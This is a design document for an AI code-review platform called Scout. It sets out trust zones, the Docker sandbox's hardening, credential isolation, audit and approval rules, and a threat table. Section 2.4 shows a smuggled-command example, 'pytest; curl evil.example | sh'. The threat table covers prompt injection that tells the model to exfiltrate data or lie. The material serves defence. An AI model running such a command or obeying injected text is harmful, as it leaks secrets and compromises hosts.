# Scout Security Model

Scout executes untrusted code and then tells humans whether a change is safe to promote. Both halves
of that sentence are security-relevant: the execution must be contained, and the conclusion must not
be forgeable. This document states the trust model, what the sandbox actually guarantees, what it
explicitly does not, and the threats that remain.

Related: [ARCHITECTURE.md](ARCHITECTURE.md) · [ENGINEERING_POLICIES.md](ENGINEERING_POLICIES.md) ·
[OPERATIONS.md](OPERATIONS.md) · [ADR 0003](adr/0003-evidence-versus-reasoning.md).

> **Status and snapshot warning.** The sandbox (`packages/sandbox/`, including the factory), webhook
> signature verification (`packages/github/scout_github/webhooks.py` and the API webhook router), the
> redaction pipeline, the audit-event model and `audit_events` table, and the `approvals` table and
> repository all exist. The API has no `main.py`, no operator authentication/authorization model, and
> no audit *repository*. These documents were written while parallel workstreams were landing code —
> the API routers and the dashboard appeared mid-pass — so "does not exist" claims were true when
> written and are the most likely part of this document to be stale. Verify against the tree.

---

## 1. Trust zones

Three zones, with trust strictly decreasing downwards. A zone may hold credentials and authority that
no zone below it may hold, and a lower zone may never widen its own reach or issue instructions to a
higher one.

| Zone | Components | Holds | May do |
|---|---|---|---|
| **Control plane** (most trusted) | `apps/api`, `apps/orchestrator`, PostgreSQL, Redis | GitHub App private key, webhook secret, datastore credentials, the sole authority to transition job status | Admit jobs, own state, schedule stages, call GitHub, record audit events |
| **AI workers** (execution plane) | `apps/worker` with `scout-llm`, `scout-agents` | Scout-scoped datastore and GitHub access, model-provider API keys, the container runtime | Retrieve bounded context, launch sandboxes, invoke tools and models, persist validated results |
| **Untrusted sandbox** (least trusted) | Repository code under `scout-sandbox` | Nothing Scout owns | Execute repository commands with bounded resources and no network by default |

The boundaries are enforced by construction:

- **Downward flow is narrow and typed.** An agent receives an `AgentContext`, not the repository, and
  that model has no credential field at all (spec sections 31 and 55). Repository code receives an
  argv vector and a minimal environment, never a shell and never an ambient environment.
- **Upward flow is validated.** `AgentResult`, `ToolResult`, `SandboxRun`, and `Finding` are Pydantic
  models with `extra="forbid"`, so malformed or unexpected output fails a contract rather than
  silently degrading a report.
- **Capabilities are granted from above.** `AgentContext.requires()` is checked in the orchestration
  layer, not inside the agent, so a hallucinating or compromised agent cannot widen its reach
  (spec section 54).

### 1.1 The worker is more privileged than it looks

The AI worker is the only process that launches sandboxes, so in the containerised deployment the
Compose `worker` service mounts `/var/run/docker.sock` (and `api`/`orchestrator` deliberately do
not). The Docker socket is effectively host root: whoever can use it can start a privileged
container. This is an accepted, documented asymmetry, not an oversight.

Why it is not the whole story: repository code never runs in the worker — it runs inside the sandbox
the worker launches — and the sandbox policy forbids mounting the socket
(`SandboxPolicy.allow_docker_socket` is rejected by the validator and re-checked by the Docker
backend before it builds its argument vector). The residual risk and its mitigation path are in §7.

The worker also holds Scout's own datastore credentials (it declares `scout-persistence`). It holds
no *production* credentials, because Scout configures none (Rule 7). The line that matters is between
Scout-scoped credentials (the worker has them) and repository code (which has none), and it is
enforced in the sandbox rather than by assuming the worker is careful.

---

## 2. Sandbox guarantees

Everything that executes repository code goes through the `Sandbox` interface
(`scout_sandbox/base.py`). Tools never touch `subprocess` directly, which is what makes these
guarantees auditable: there is exactly one place in Scout where untrusted code is launched.

The interface's documented invariants:

- The command executes from an **`argv` list**. No shell interprets repository input, tool
  arguments, or configuration values, ever.
- **Only the workspace is writable**; the rest of the host is not reachable.
- The **environment is a minimal allowlist**; control-plane variables are refused.
- **Network access follows the policy**, and the default is none.
- A **timeout always terminates the process and its descendants**.
- **Output is streamed to files**, never buffered unbounded in memory.

### 2.1 The Docker backend (the production isolation boundary)

`DockerSandbox` runs each command in a fresh, short-lived container built with:

```
--rm --name <scout-sandbox-...>
--network none                      # default deny; bridge only for explicit OPEN
--memory <limits.memory_mb>m --memory-swap <same>   # swap disabled, so the cap is real
--cpus <limits.cpus> --pids-limit <limits.pids_limit>   # bounds a fork bomb
--read-only
--tmpfs /tmp:rw,noexec,nosuid,nodev,size=512m
--cap-drop ALL
--security-opt no-new-privileges
--user 1000:1000
--volume <workspace>:/workspace:rw                  # the only mount
--stop-timeout 10
```

Additional properties:

- `--memory-swap` equal to `--memory` means the kernel cannot fall back to swap and quietly exceed
  the ceiling.
- The host Docker socket is **never** mounted, and the backend re-checks
  `policy.allow_docker_socket` before constructing the vector — the security properties of this
  backend are only as good as that list, which is why it is a method a test can assert against rather
  than inline code.
- Capture files (stdout/stderr) are written **outside** the repository tree, so repository code cannot
  read or tamper with Scout's record of its own output.
- Docker's own exit codes 125/126/127 are classified as **infrastructure** launch errors, not test
  failures, so a runtime problem cannot become a false accusation against the pull request.
- The image (`infra/docker/sandbox-python.Dockerfile`) carries an explicit security contract: it holds
  no control-plane secrets, no `.env`, no cloud credentials, and only the toolchain the repository
  needs (git, Python 3.12, Node 20); it runs as non-root uid 1000 and has no `CMD`, because the
  caller always supplies the exact command.

### 2.2 The local backend is not a security boundary

`LocalSandbox` runs repository code as the current user on the host, guarded only by POSIX resource
limits and a scrubbed environment. Its own docstring says so: **this backend is not a security
boundary.** It exists because it makes the platform runnable, testable, and debuggable in
development. It is enabled explicitly with `SCOUT_SANDBOX_BACKEND=local` (the `.env.example` default).

`scout_sandbox.factory.resolve_backend()` is the control that keeps it out of production, and it is
enforced in code rather than documented:

- it refuses `local` with `ConfigurationError` when `SCOUT_ENV` is `production` or `prod`;
- it logs a warning whenever `local` is selected at all, naming the environment;
- it validates the configured value against `SandboxBackendKind`, so a typo fails rather than
  silently falling back to a default.

### 2.3 Default-deny network policy

`NetworkMode` has three values and the default is `NONE`:

| Mode | Meaning | Enforceable by the Docker backend? |
|---|---|---|
| `NONE` | No network at all. **The default.** (`SCOUT_SANDBOX_NETWORK=none`) | Yes — `--network none`. |
| `ALLOWLIST` | Egress only to explicit `allowed_hosts` | **No.** Docker's `--network` flag cannot express a host allowlist, so the backend raises `SandboxBackendUnavailable` with an actionable message rather than pretending. A real allowlist needs an egress proxy on a user-defined network. |
| `OPEN` | Full egress. Development only; documented as refused when `SCOUT_ENV=production`. | Partially — it maps to `bridge`, but no code refuses it in production yet. |

`SandboxPolicy` rejects a contradictory configuration at construction: `ALLOWLIST` with no hosts, or
`NONE` with hosts listed. `scripts/sandbox_smoke.sh` is the executable assertion that the default
holds: it builds the image, runs a command under the hardening flags, and fails if network egress to
its probe host succeeds.

### 2.4 Credential isolation

Three layers, all in code:

1. **Allowlist construction.** `build_minimal_environment()` builds the sandbox environment from a
   fixed passthrough allowlist and raises `PolicyViolation` on any forbidden key. It also sets
   deterministic, non-interactive defaults (`NO_COLOR`, `CI=1`, `TERM=dumb`, `GIT_TERMINAL_PROMPT=0`,
   `PYTHONDONTWRITEBYTECODE`).
2. **Policy re-check.** `SandboxPolicy.assert_environment_is_safe()` intersects the environment with
   `forbidden_environment` and raises `PolicyViolation` naming the leaked variables. The backend calls
   it immediately before execution, so the check cannot be forgotten at a call site.
   `forbidden_environment` covers `SCOUT_DATABASE_URL`, `SCOUT_REDIS_URL`,
   `SCOUT_GITHUB_PRIVATE_KEY_PATH`, `SCOUT_GITHUB_WEBHOOK_SECRET`, `SCOUT_OPENAI_API_KEY`,
   `SCOUT_ANTHROPIC_API_KEY`, `SCOUT_SMTP_PASSWORD`, `SCOUT_GOOGLE_CHAT_WEBHOOK_URL`,
   `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`, and `GITHUB_TOKEN`.
3. **No shell.** `.scout/engineering.yaml` commands are tokenised into an argv vector and rejected at
   parse time if they contain shell metacharacters, so `pytest; curl evil.example | sh` never reaches
   an execution path.

---

## 3. Secrets rules

| Rule | Enforced by |
|---|---|
| **Never commit a secret.** | `.gitignore` excludes `.env`, `.env.*` (with `!.env.example`), `*.pem`, `*.p8`, `*.key`, `secrets/`, and `.scout/local.yaml`. `.env.example` contains no credentials. |
| **Never put a secret in a prompt.** | `AgentContext` has no credential field; prompts are assembled from bounded context. `ModelRequestRecord` stores a `prompt_digest`, not prompt text, precisely so a prompt that could contain sensitive repository text is not persisted. |
| **Never expose a secret to repository code.** | The three-layer credential isolation in §2.4. |
| **Never send production credentials to workers.** | Scout configures none: `.env.example` defines only Scout's own datastore, GitHub App, LLM, sandbox, notification, and observability settings. |
| **Never log a secret.** | The redaction processor runs as the **last** processor before rendering, on every event, for every process; stdlib logging (uvicorn, SQLAlchemy, httpx) is routed through the same pipeline so third-party noise is redacted too. `AuditEvent.metadata` is documented as never containing secrets. |
| **Never read `.env` into a sandbox.** | Not mounted; not in the allowlist; refused by name. |

The realistic leak paths that remain are: a secret committed **inside the repository under review**
(secret scanning is the mitigation, and the dependency on that tool is tracked in
[ROADMAP.md](ROADMAP.md) M12); a secret echoed into tool output and stored as an artifact (artifacts
therefore require access control — see §7); and a secret pasted into a GitHub PR body, which becomes
`requirement_text` and is sent to a model provider.

---

## 4. `.scout/engineering.yaml` is untrusted input

The repository configuration file is read from the pull-request author's repository, so it may be
written by anyone who can open a PR. `scout_domain/config/repository.py` treats it accordingly:

- **Strict schema, unknown keys rejected.** It is parsed into `ScoutRepositoryConfig` with
  `extra="forbid"`. A typo produces a clear finding on the next pull request instead of silently
  running with defaults (spec section 14). A *missing* file gets an explicit documented fallback; a
  *malformed* file never does — it raises `RepositoryConfigurationError` with per-field detail.
- **No shell, ever.** `CommandSpec` rejects shell metacharacters (`;`, `|`, `&`, `>`, `<`, backticks,
  `$(`, `${`, newlines, `&&`, `||`, `*`, `?`, `~`) and tokenises the rest with `shlex.split`. The
  result is an argv list executed without a shell.
- **Custom command names** are restricted to alphanumerics, `_`, and `-`.
- **Sandbox overrides are requests, not grants.** `SandboxOverrideConfig` values are clamped down to
  the operator's ceiling by `factory.build_resource_limits()` (`min(requested, ceiling)` per field),
  and a repository-requested `network_mode` is ignored rather than honoured (spec section 52).
- **Stage overrides are explicit.** `verification.required_stages` and `disabled_stages` cannot
  overlap; a disabled stage is recorded as a skip with a reason.

**One control and one remaining gap, stated plainly.**

1. **Override clamping is implemented, in the sandbox factory.** `factory.build_resource_limits()`
   builds the operator ceiling from the environment and then applies `min(requested, ceiling)` for
   `memory_mb`, `cpus`, and `command_timeout_seconds`, logging every case where a repository request
   lowered a platform default. `factory.build_policy()` ignores a repository-requested
   `network_mode` entirely — the operator policy wins, and the mismatch is logged as a warning. The
   residual risk is *location*: the clamp lives in `scout-sandbox`, so any future call path that
   constructs a `ResourceLimits` or `SandboxPolicy` without going through the factory bypasses it.
   The factory is the only supported construction path, and that should be enforced by a test.
2. `disabled_stages` lets a repository opt **out** of a stage. Overlap with `required_stages` is
   rejected, but nothing yet prevents an operator-level policy from being overridden by a repository
   that disables, say, `SECURITY_SCANNING`. Operator-mandated required stages need to be enforced
   above repository configuration.

---

## 5. Audit logging

Rule 6: every privileged action is audited. `AuditEvent` records actor, actor type, dotted action,
resource, resource id, timestamp, structured metadata, `job_id`, `correlation_id`, and (for
human-initiated actions) `source_ip`. The action namespaces that must always be audited are listed in
`_PRIVILEGED_PREFIXES`: `approval`, `job`, `question`, `knowledge`, `repository`, `sandbox`, `secret`,
`policy`, `user`, `notification`; `AuditEvent.is_privileged` classifies an event against them.
`ActorType` distinguishes `SYSTEM`, `AGENT`, `HUMAN`, `WEBHOOK`, and `WORKER`, so the trail records
who acted, not merely what happened.

The `audit_events` table, the `AuditEvent` ↔ `AuditEventRow` mapping, and the append-only contract
all exist. There is **no `AuditRepository` yet**, so nothing currently writes audit events and
nothing structurally prevents an update or delete path from being added when one is written.

**Gap:** append-only is enforced by convention plus the absence of a writer, not by structure. The
first audit-repository change must expose no update/delete operation for `audit_events`, and a test
should assert that.

---

## 6. Approval authority

Scout cannot authorize its own work, and this is structural rather than procedural:

- `Approval.decided_by_type` must be `ActorType.HUMAN`; the model validator rejects any other actor,
  so there is no code path that constructs an approval on Scout's behalf (spec section 46).
- `Approval.commit_sha` is mandatory: approval is bound to the exact commit that was authorized.
- When the pull request moves, the approval is **invalidated, not deleted**
  (`invalidated_at`/`invalidated_reason`, set together and never before `decided_at`), so the audit
  trail retains what was authorized and when. `Approval.applies_to(commit_sha)` returns false for any
  other commit, which is the mechanism behind "old approval = invalid; new verification = required"
  (spec section 74).
- The `Capability` enum contains no merge, push, approve, or deploy capability. `GITHUB_WRITE_CHECK`
  (a check run) is the only GitHub write Scout has, so Scout cannot merge even if it wanted to.
- `ApprovalGate.blocking` defaults to `False`, so the observe-only pilot cannot gate the development
  process (spec section 77).

**What is still missing.** The `approvals` table and `ApprovalRepository` exist —
`record`, a one-call human-approval builder, and `invalidate_for_job` with validity-scoped reads —
but there is no API approval endpoint and no operator authentication/authorization model, so an
approval cannot yet be recorded through the product surface. Until both exist, approval authority is
a domain-model and persistence-layer guarantee without a delivery mechanism, and the API must not be
exposed beyond localhost.

---

## 7. Threat model

Threats are stated as *threat → mitigation → residual risk*. Residual risk is what remains after the
mitigation, not what is hoped to be covered elsewhere.

| # | Threat | Mitigation | Residual risk |
|---|---|---|---|
| 1 | Malicious pull request executes code in the sandbox and attacks the host | Container with `--network none`, `--read-only`, `--cap-drop ALL`, `no-new-privileges`, non-root uid, PID/memory/CPU caps, workspace-only mount, swap disabled | A container is not a virtual machine. A kernel or container-runtime exploit escapes it. Scout treats the sandbox as defence in depth, not the sole control, and keeps production credentials out of the environment entirely. |
| 2 | Compromised third-party dependency runs install scripts during `npm ci`/`pip install` | Install scripts run **only** inside the sandbox, with no network by default and no credentials; dependency scanning and lockfile review are roadmap items | A dependency with a permitted install step still runs arbitrary code in the sandbox (threat 1). With `network none` it cannot exfiltrate; if egress is ever enabled for a legitimate install, exfiltration becomes possible for the duration. |
| 3 | Prompt injection: repository content or a PR description instructs the model to exfiltrate or to lie | `AgentContext` contains no credentials and no write capability; tool requests are resolved against a registry rather than executed as free-form shell; agents cannot spawn agents; `AgentRole` is a closed set | A successful injection can still produce misleading *findings*. The evidence model bounds the damage: an injected conclusion is `INFERENCE`-strength, capped at 0.65 confidence, and can never be a verified fact ([ADR 0003](adr/0003-evidence-versus-reasoning.md)). |
| 4 | The worker container, which holds the Docker socket, is compromised | The socket is mounted only in the worker; `api`/`orchestrator` never get it; repository code never runs in the worker; the sandbox policy refuses the socket and re-checks before building the vector | The socket is effectively host root. A worker compromise is a host compromise. Mitigation path: a Docker socket proxy that allows only `container create/start/wait/rm`, or a rootless runtime on the Linux worker (ADR 0001 phase 3). |
| 5 | Secret exfiltration from the sandbox | `build_minimal_environment` allowlist, `forbidden_environment` re-check, no `.env` mount, no shell in declared commands, `--network none` by default | A secret **committed in the repository** is readable by the sandbox by definition, and could be captured into an artifact. Secret scanning (M12) detects it; artifact access control must prevent the artifact from becoming a second copy of the leak. |
| 6 | Forged or replayed GitHub webhook creates or duplicates work | `verify_webhook_signature` computes HMAC-SHA256 over the **raw** body, requires the `X-Hub-Signature-256` header, rejects a malformed or `sha1`-prefixed header, and compares with `hmac.compare_digest` so a missing signature and a wrong signature are indistinguishable; the API router reads the raw body before parsing, refuses the delivery when signature verification is required but no secret is configured, and requires a delivery id because without one there is no idempotency key. `webhook_events.delivery_id` is `UNIQUE`, so redelivery is absorbed by the database rather than by a racing read-then-write check | The webhook secret is the whole control: if it leaks, an attacker can sign deliveries, and rotation is manual. The routers are not mounted yet (`scout_api/main.py` is missing), so none of this is reachable in a running process. |
| 7 | Unauthorized or forged approval | `Approval` requires `ActorType.HUMAN`, is bound to `commit_sha`, and is invalidated rather than deleted; `ApprovalRepository` exposes record/builder/invalidation with validity-scoped reads, and privileged actions are audited | No operator authentication model and no approval endpoint exist yet, so approval records cannot be created through the product and a compromised operator account would be indistinguishable from its owner. Both are prerequisites for M15. |
| 8 | Secrets leak into logs, traces, or model-request records | Redaction processor on every event as the last step before rendering; stdlib logging routed through the same pipeline; `prompt_digest` instead of prompt text; audit metadata documented as secret-free | Redaction is pattern- and key-based. An unrecognised secret shape in a free-text field can still pass through. Traces and metrics need the same review as logs. |
| 9 | Resource exhaustion / denial of service by a submitted PR | `ResourceLimits` per sandbox (2 GiB, 1 CPU, 256 PIDs, 900 s per command, 3600 s lifetime), `SCOUT_MAX_JOB_RUNTIME_SECONDS=1800`, `SCOUT_MAX_REPO_SIZE_MB=2048`, `SCOUT_MAX_CONCURRENT_SANDBOXES=1`, command timeouts enforced by killing the process group | A flood of PRs still consumes queue depth and host memory serially. Rate limiting at admission and per-repository quotas are not implemented. |
| 10 | Repository configuration weakens verification | Strict schema, no shell, unknown keys rejected, resource and network overrides clamped or ignored by the sandbox factory, required/disabled stage overlap rejected | Repository `disabled_stages` can opt out of stages, and nothing enforces an operator-level stage floor above repository configuration (§4). And the clamp lives in the sandbox factory, so any construction path that bypasses the factory bypasses the clamp. |
| 11 | The local sandbox backend is used where isolation is required | Documented as **not** a security boundary; `factory.resolve_backend()` refuses it under `SCOUT_ENV=production`/`prod`, validates the configured value, and logs a warning whenever it is selected; Docker is the code default when `SCOUT_SANDBOX_BACKEND` is unset | A deployment that sets `SCOUT_ENV` to something other than `production`/`prod` while intending to be production is not refused. `SCOUT_ENV` is therefore a security-relevant setting, not just a logging switch. |
| 12 | Audit log tampering or loss | Append-only by contract; no update/delete path intended; dumps are the out-of-band record (§8 of [OPERATIONS.md](OPERATIONS.md)) | Direct database access can still modify rows, and a restore rolls the log back. There is no hash chain or external append-only sink. |
| 13 | Repository content is sent to a third-party model provider | Only selectively retrieved context enters `AgentContext` (spec section 17); the `fake` provider is the default and sends nothing externally; provider selection is explicit per agent role | Once a real provider is configured, retrieved source and PR text leave the machine. Provider data-retention terms and redaction of sensitive paths are operational controls, not code controls. |
| 14 | Unauthorized access to the dashboard or API | Intended: operator authentication and authorization on every non-health endpoint; the dashboard holds no control-plane credentials and acts as an authenticated client | **Planned:** no auth model exists. Until it does, the API must not be exposed beyond localhost. |

---

## 8. Security review checklist for changes

Before merging a change that touches execution, credentials, or authority:

1. Does it introduce a path that executes repository-controlled input, and does that path go through
   `Sandbox`? There must be no direct `subprocess`, `os.system`, or `eval` outside
   `packages/sandbox/`.
2. Does it add an environment variable to a sandbox, and is that variable in the allowlist rather than
   passed through wholesale?
3. Does it add a credential to Scout's configuration, and is that credential reachable from the
   worker, an agent prompt, a log line, or a sandbox?
4. Does it add or change a `Capability`, and does the change widen what an agent can do?
5. Does it add a write path to `audit_events`, or any update/delete on an audited resource?
6. Does it let an AI conclusion gain confidence, provenance, or recommendation authority it did not
   have? ([ADR 0003](adr/0003-evidence-versus-reasoning.md) lists the tests that must fail if so.)
7. Does it relax a sandbox flag (`--read-only`, `--cap-drop`, `--user`, `--network`), and is the
   relaxation justified in a new ADR rather than a comment?
